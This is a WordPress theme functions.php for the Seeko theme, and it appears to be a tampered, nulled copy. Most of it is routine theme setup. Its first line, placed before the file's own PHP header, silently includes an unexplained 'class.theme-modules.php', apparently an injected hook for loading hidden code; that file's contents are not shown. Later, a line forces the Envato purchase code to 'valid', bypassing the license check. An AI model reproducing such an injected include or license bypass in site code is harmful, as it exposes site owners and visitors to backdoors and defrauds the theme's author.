<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Main theme functions file
 *
 * @package WordPress
 * @subpackage Seeko
 * @author SeventhQueen <themesupport@seventhqueen.com>
 * @since Seeko 1.0
 */

/***************************************************
 * :: Load SQ framework
 ***************************************************/

define( 'SVQ_THEME_VERSION', '1.1.6' );
/* Theme specific. Required to be defined at top of file */
add_theme_support( 'svq-customizr' );
add_theme_support( 'dynamic-css' );


if ( ! isset( $content_width ) ) {
	$content_width = 1000;
}

/* Load and init framework */
require_once dirname( __FILE__ ) . '/sq-framework/framework.php';


/***************************************************
 * :: Load Theme specific functions
 ***************************************************/

require_once( trailingslashit( SVQ_LIB_DIR ) . 'theme-functions.php' );


/***************************************************
 * :: Required plugins
 ***************************************************/

if ( is_admin() ) {
	require_once SVQ_LIB_DIR . '/required-plugins.php';
}


/**
 * Sets up theme defaults and registers the various WordPress features
 *
 * @uses load_theme_textdomain() For translation/localization support.
 * @uses add_editor_style() To add a Visual Editor stylesheet.
 * @uses add_theme_support() To add support for post thumbnails, automatic feed links,
 *    custom background, and post formats.
 * @uses register_nav_menu() To add support for navigation menus.
 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
 *
 * @since SQ Framework 1.0
 */
function svq_setup() {

	/*
	 * Makes theme available for translation.
	 * Translations can be added to the /languages/ directory.
	 */
	load_theme_textdomain( 'seeko', get_template_directory() . '/languages' );

	/* This theme styles the visual editor with editor-style.css to match the theme style. */
	add_editor_style( 'assets/style-editor.css' );

	/* Adds RSS feed links to <head> for posts and comments. */
	add_theme_support( 'automatic-feed-links' );

	// Enable selective refresh for widgets being managed within the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );

	// Enable support for a custom logo.
	add_theme_support( 'custom-logo', array(
		'height'      => 80,
		'width'       => 200,
		'flex-height' => false,
		'flex-width'  => true,
		'header-text' => array( 'site-title', 'site-description' ),
	) );

	// Enable plugins and themes to manage the document title tag.
	add_theme_support( 'title-tag' );


	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'image',
		'gallery',
		'quote',
		'video',
	) );

	/* This theme uses wp_nav_menu() in two locations. */
	register_nav_menu( 'primary', esc_html__( 'Main Menu', 'seeko' ) );

	/* This theme uses a custom image size for featured images, displayed on "standard" posts. */
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'post-featured', 1200, 9999, false );
	add_image_size( 'post-card', 670, 9999, false );
	add_image_size( 'post-tiny', 45, 9999, false );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/* Third-party plugins */

}
update_option( 'envato_purchase_code_23175730', 'valid' );
add_action( 'after_setup_theme', 'svq_setup' );


/***************************************************
 * :: Load Theme files
 ***************************************************/

add_action( 'after_setup_theme', 'svq_theme_functions', 12 );

function svq_theme_functions() {

	// Gutenberg compatibility
	require_once( SVQ_LIB_DIR . '/gutenberg.php' );

	// Menu structure
	require_once( SVQ_LIB_DIR . '/menu.php' );

	/* BuddyPress compatibility */
	if ( function_exists( 'bp_is_active' ) ) {
		require_once( SVQ_LIB_DIR . '/plugins/buddypress/buddypress.php' );
	}

	if ( defined( 'ELEMENTOR_PATH' ) ) {
		require_once( SVQ_LIB_DIR . '/plugins/elementor/elementor.php' );
	}

	/* PMPRO compatibility */
	if ( function_exists( 'pmpro_url' ) ) {
		require_once( SVQ_LIB_DIR . '/plugins/pmpro.php' );
	}
	/* Stax compatibility */
	if ( defined( 'STAX_VERSION' ) ) {
		require_once( SVQ_LIB_DIR . '/plugins/stax.php' );
	}
}


/***************************************************
 * :: Theme panel
 ***************************************************/
if ( is_admin() ) {
	require_once( SVQ_FW_DIR . '/lib/theme-welcome/init.php' );
	require_once( SVQ_LIB_DIR . '/theme-config.php' );
}


/***************************************************
 * :: Load components
 ***************************************************/

$svq_components = array(
	'base.php',
	'breadcrumb.php',
	'extras.php',
	'author-bio.php',
);

$svq_components = apply_filters( 'svq_components', $svq_components );

foreach ( $svq_components as $component ) {
	$file_path = trailingslashit( SVQ_LIB_DIR ) . 'components/' . $component;
	if ( file_exists( $file_path ) ) {
		include_once $file_path;
	}
}

if ( ! function_exists( 'svq_widgets_init' ) ) {
	/**
	 * Registers our main widget area and the front page widget areas.
	 *
	 * @since 1.0
	 */
	function svq_widgets_init() {
		register_sidebar( array(
			'name'          => esc_html__( 'Main Sidebar', 'seeko' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Main Sidebar', 'seeko' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => esc_html__( 'Footer Column 1', 'seeko' ),
			'id'            => 'footer-1',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Column 2', 'seeko' ),
			'id'            => 'footer-2',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Column 3', 'seeko' ),
			'id'            => 'footer-3',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Column 4', 'seeko' ),
			'id'            => 'footer-4',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
	}
}
add_action( 'widgets_init', 'svq_widgets_init' );


/***************************************************
 * :: Scripts/Styles load
 ***************************************************/

add_action( 'wp_enqueue_scripts', 'svq_frontend_files', 9 );
add_action( 'wp_enqueue_scripts', 'svq_frontend_files_enqueue', 11 );
if ( ! function_exists( 'svq_frontend_files' ) ) {
	// Register some javascript files
	function svq_frontend_files() {

		$min = '';
		if ( svq_option( 'dev_mode', false ) == false ) {
			$min = '.min';
		}

		/* Footer scripts */
		wp_register_script( 'jRespond', get_template_directory_uri() . '/assets/js/jRespond' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'bootstrap', get_template_directory_uri() . '/assets/js/bootstrap' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'jquery-lazy', get_template_directory_uri() . '/assets/js/jquery.lazy' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'slick', get_template_directory_uri() . '/assets/js/slick' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'jquery-fitVids', get_template_directory_uri() . '/assets/js/jquery.fitVids' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'seeko-flexMenu', get_template_directory_uri() . '/assets/js/jquery.flexMenu' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );
		wp_register_script( 'seeko-app', get_template_directory_uri() . '/assets/js/functions' . $min . '.js', array( 'jquery' ), SVQ_THEME_VERSION, true );

		// Register the styles.
		wp_register_style( 'seeko-icons', svq_get_font_icons_path(), array(), SVQ_THEME_VERSION, 'all' );
		wp_register_style( 'seeko', get_template_directory_uri() . '/assets/theme-static' . $min . '.css', array(), SVQ_THEME_VERSION, 'all' );

		wp_register_style( 'svq-style', CHILD_THEME_URI . '/style.css', array(), SVQ_THEME_VERSION, 'all' );

	} // end svq_frontend_files()
}

if ( ! function_exists( 'svq_frontend_files_enqueue' ) ) {
	// Enqueue some javascript files
	function svq_frontend_files_enqueue() {

		// JS
		wp_enqueue_script( 'jRespond' );
		wp_enqueue_script( 'bootstrap' );

		if ( svq_option( 'img_lazy', 1 ) ) {
			wp_enqueue_script( 'jquery-lazy' );
		}

		wp_enqueue_script( 'jquery-fitVids' );

		$obj_array = array(
			'ajaxUrl' => admin_url( 'admin-ajax.php' ),
		);

		$obj_array = apply_filters( 'svq_localize_app', $obj_array );
		wp_localize_script( 'seeko-app', 'skLocale', $obj_array );


		wp_enqueue_script( 'seeko-app' );
		wp_script_add_data( 'seeko-app', 'defer', true );


		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

		// CSS
		wp_enqueue_style( 'seeko-icons' );
		wp_enqueue_style( 'seeko' );
	}
}


add_action( 'wp_enqueue_scripts', 'svq_load_files_plugin_compat', 99999 );

function svq_load_files_plugin_compat() {

	$min = '';
	if ( svq_option( 'dev_mode', false ) == false ) {
		$min = '.min';
	}

	// Load fallback dynamic styling
	wp_register_style( 'seeko-dynamic', get_template_directory_uri() . '/assets/theme-dynamic' . $min . '.css', array(), SVQ_THEME_VERSION, 'all' );
	wp_enqueue_style( 'seeko-dynamic' );

	//enqueue child theme style only if activated
	if ( is_child_theme() ) {
		wp_enqueue_style( 'svq-style' );
	}


} // svq_load_css_files_plugin_compat()


add_action( 'after_setup_theme', 'svq_load_dynamic_style', 14 );

function svq_load_dynamic_style() {
	SVQ_FW::set_config( 'dynamic_css_src', [ get_template_directory() . '/assets/scss/theme-dynamic.scss' ] );
	SVQ_FW::set_config( 'dynamic_css_lang', 'scss' );

	if ( defined( 'SEEKO_DEV' ) ) {
		SVQ_FW::set_config( 'custom_style_path', get_template_directory() . '/assets' );
		SVQ_FW::set_config( 'custom_style_url', get_template_directory_uri() . '/assets' );
		SVQ_FW::set_config( 'custom_style_name', 'theme-dynamic.css' );
	} else {
		SVQ_FW::set_config( 'custom_style_name', 'seeko-dynamic.css' );
	}

	add_action( 'svq_dynamic_after_enqueue', function () {
		wp_dequeue_style( 'seeko-dynamic' );

		if ( defined( 'SEEKO_DEV' ) && SEEKO_DEV === true ) {
			wp_dequeue_style( 'seeko' );
			wp_dequeue_style( 'svq-dynamic' );
			wp_enqueue_style( 'seeko-main', get_template_directory_uri() . '/assets/theme.css', array(), SVQ_THEME_VERSION, 'all' );

			wp_dequeue_style( 'seeko-rtmedia-main' );
			wp_dequeue_style( 'bp-parent-css' );

		}

	} );
}


/* Load any custom css */
add_action( 'wp_enqueue_scripts', 'svq_render_custom_css', 14 ) ;
function svq_render_custom_css() {

	if ( SVQ_FW::$custom_css != '' ) {
		wp_add_inline_style( get_template(), SVQ_FW::$custom_css );
	}
}

/* Load hosted fonts data */
add_action( 'svq_hosted_fonts', 'svq_hosted_fonts_load_css' );
function svq_hosted_fonts_load_css( $css ) {
	add_action( 'wp_enqueue_scripts', function() use ( $css ) {
		wp_add_inline_style( 'seeko', $css );
	}, 14 );
}

/* Helper to enqueue flexMenu */
function svq_flexmenu_init() {
	return 'window.addEventListener(\'DOMContentLoaded\', function() {
			function svqFlexMenu() {
			jQuery(".flex-menu").seekoFlexMenu({
				cutoff: 0,
				threshold: 2,
				popupAbsolute: false,
				showOnHover: false,
				popupClass: "dropdown-menu",
				linkText: "<i class=\'icon icon-more-fill\'></i>",
				linkTextAll: "<i class=\'icon icon-more-fill\'></i>"
			});
		}
		jQuery(document).ready(function(){
			setTimeout(function () {
			jQuery(".flex-menu.flex-menu-overflow").removeClass("flex-menu-overflow");
			}, 1500);
		});
		jQuery(window).on("load", svqFlexMenu);
		jQuery(window).on("resize", svqFlexMenu);
		
		jQuery(window).on("resize", function() {
			jQuery(".flex-menu").addClass("flex-menu-overflow");
			jQuery(".flex-menu.flex-menu-overflow").removeClass("flex-menu-overflow");
		});
		});';
}
function svq_flex_enqueue() {

	if ( ! wp_script_is( 'seeko-flexMenu' ) ) {
		wp_enqueue_script( 'seeko-flexMenu' );
		$flex_data = svq_compress( svq_flexmenu_init() );
		wp_add_inline_script( 'seeko-flexMenu', $flex_data );
	}
}


/***************************************************
 * :: ADMIN CSS
 ***************************************************/
add_action( 'admin_enqueue_scripts', 'svq_admin_styles' );
function svq_admin_styles() {
	wp_register_style( 'svq-admin', SVQ_LIB_URI . '/assets/admin-custom.css', false, '1.0', 'screen' );
	wp_enqueue_style( 'svq-admin' );
}

add_action( 'admin_enqueue_scripts', 'svq_gutenberg_admin_custom_css');

function svq_gutenberg_admin_custom_css() {
	global $pagenow;
	if ( ( $pagenow == 'post.php' ) ) {

		$font_size = '18px';
		$typography_val = svq_option( 'font_size_base' );
		if ( $typography_val && is_array( $typography_val ) ) {
			$font_size   = $typography_val['desktop']['size'] . $typography_val['desktop']['unit'];
		}
		wp_add_inline_style( 'common', '.wp-toolbar { font-size: ' . $font_size . ';}' );
	}
}


add_action( 'wp_enqueue_scripts', 'svq_async_defer', 9 );
function svq_async_defer() {
	wp_script_add_data( 'admin-bar', 'defer', true );
	wp_script_add_data( 'wp-embed', 'defer', true );
	wp_script_add_data( 'comment-reply', 'defer', true );
}


/**
 * Generate preload markup for stylesheets.
 *
 * @param object $wp_styles Registered styles.
 * @param string $handle The style handle.
 */
function svq_get_preload_stylesheet_uri( $wp_styles, $handle ) {

	if ( svq_option( 'query_string', 0 ) ) {
		$version = '';
	} else {
		$version = '?ver=' . $wp_styles->registered[ $handle ]->ver;
	}
	$preload_uri = $wp_styles->registered[ $handle ]->src . $version;
	return $preload_uri;
}

/**
 * Adds preload for in-body stylesheets depending on what templates are being used.
 *
 * @link https://developer.mozilla.org/en-US/docs/Web/HTML/Preloading_content
 */
function svq_add_body_style() {

	// Get registered styles.
	$wp_styles = wp_styles();

	$preloads = array();

	// Preload content.css.
	$preloads['seeko'] = svq_get_preload_stylesheet_uri( $wp_styles, 'seeko' );
	$preloads['seeko-icons'] = svq_get_preload_stylesheet_uri( $wp_styles, 'seeko-icons' );

	// Output the preload markup in <head>.
	foreach ( $preloads as $handle => $src ) {
		echo '<link rel="preload" id="' . esc_attr( $handle ) . '-preload" href="' . esc_url( $src ) . '" as="style"/>';
		echo "\n";
	}

}
if ( svq_option( 'css_preload', 1 ) ) {
	add_action( 'wp_head', 'svq_add_body_style', 6 );
}

function svq_new_wp_login_url() {
	return home_url( '/' );
}

add_filter( 'login_headerurl', 'svq_new_wp_login_url' );

function svq_new_wp_login_title() {
	return get_option( 'blogname' );
}

add_filter( 'login_headertitle', 'svq_new_wp_login_title' );


if ( ! function_exists( '_wp_render_title_tag' ) ) {
	/**
	 * Generate head title tag
	 */
	function svq_slug_render_title() {
		?>
		<title><?php wp_title( '|', true, 'right' ); ?></title>
		<?php
	}

	add_action( 'wp_head', 'svq_slug_render_title' );
}


if ( ! function_exists( 'svq_wp_title' ) ) {
	/**
	 * Creates a nicely formatted and more specific title element text
	 * for output in head of document, based on current view.
	 *
	 * @since 1.0
	 *
	 * @param string $title Default title text for current view.
	 * @param string $sep Optional separator.
	 *
	 * @return string Filtered title.
	 */
	function svq_wp_title( $title, $sep ) {
		global $paged, $page;

		if ( is_feed() ) {
			return $title;
		}
		// Add the site name.
		$title .= get_bloginfo( 'name' );

		// Add the site description for the home/front page.
		$site_description = get_bloginfo( 'description', 'display' );
		if ( $site_description && ( is_home() || is_front_page() ) ) {
			$title = "$title $sep $site_description";
		}
		// Add a page number if necessary.
		if ( $paged >= 2 || $page >= 2 ) {
			$title = "$title $sep " . sprintf( esc_html__( 'Page %s', 'seeko' ), max( $paged, $page ) );
		}

		return $title;
	}

	if ( ! function_exists( '_wp_render_title_tag' ) ) {
		add_filter( 'wp_title', 'svq_wp_title', 10, 2 );
	}

}


/***************************************************
 * :: oEmbed manipulation for youtube/vimeo video
 ***************************************************/

if ( ! function_exists( 'svq_add_video_wmode_transparent' ) ) {
	/**
	 * Automatically add wmode=transparent to embeded media
	 * Automatically add showinfo=0 for youtube
	 *
	 * @param string $html
	 * @param string $url
	 * @param string $attr
	 *
	 * @return string
	 */
	function svq_add_video_wmode_transparent( $html, $url, $attr ) {
		if ( strpos( $html, 'youtube.com' ) !== null || strpos( $html, 'youtu.be' ) !== null ) {
			$info = '&amp;showinfo=0';
		} else {
			$info = '';
		}

		if ( strpos( $html, '<embed src=' ) !== false ) {
			return str_replace( '</param><embed', '</param><param name="wmode" value="opaque"></param><embed wmode="opaque" ', $html );
		} elseif ( strpos( $html, 'feature=oembed' ) !== false ) {
			return str_replace( 'feature=oembed', 'feature=oembed&amp;wmode=opaque' . $info, $html );
		} else {
			return $html;
		}
	}
}

add_filter( 'oembed_result', 'svq_add_video_wmode_transparent', 10, 3 );

if ( ! function_exists( 'svq_the_attached_image' ) ) {
	/**
	 * Print the attached image with a link to the next attached image.
	 *
	 * @since 1.0
	 *
	 * @return void
	 */
	function svq_the_attached_image() {
		$post = get_post();
		/**
		 * Filter the default attachment size.
		 *
		 * @since 1.0
		 *
		 * @param array $dimensions {
		 *     An array of height and width dimensions.
		 *
		 * @type int $height Height of the image in pixels. Default 810.
		 * @type int $width Width of the image in pixels. Default 810.
		 * }
		 */
		$attachment_size     = apply_filters( 'svq_attachment_size', array( 810, 810 ) );
		$next_attachment_url = wp_get_attachment_url();

		/*
		 * Grab the IDs of all the image attachments in a gallery so we can get the URL
		 * of the next adjacent image in a gallery, or the first image (if we're
		 * looking at the last image in a gallery), or, in a gallery of one, just the
		 * link to that image file.
		 */
		$attachment_ids = get_posts( array(
			'post_parent'    => $post->post_parent,
			'fields'         => 'ids',
			'numberposts'    => - 1,
			'post_status'    => 'inherit',
			'post_type'      => 'attachment',
			'post_mime_type' => 'image',
			'order'          => 'ASC',
			'orderby'        => 'menu_order ID',
		) );

		// If there is more than 1 attachment in a gallery...
		if ( count( $attachment_ids ) > 1 ) {
			foreach ( $attachment_ids as $attachment_id ) {
				if ( $attachment_id == $post->ID ) {
					$next_id = current( $attachment_ids );
					break;
				}
			}

			// get the URL of the next image attachment...
			if ( $next_id ) {
				$next_attachment_url = get_attachment_link( $next_id );
			} // or get the URL of the first image attachment.
			else {
				$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
			}
		}

		printf( '<a href="%1$s" rel="attachment">%2$s</a>',
			esc_url( $next_attachment_url ),
			wp_get_attachment_image( $post->ID, $attachment_size )
		);
	}
}

/**
* Adding Custom Roles
*/
add_role(
	'teacher',
		__( 'Teacher' ),
		array(
		'read'         => true,
		'edit_posts'   => true,
	)
);

add_role(
	'student',
		__( 'Student' ),
		array(
		'read'         => true,
		'edit_posts'   => false,
	)
);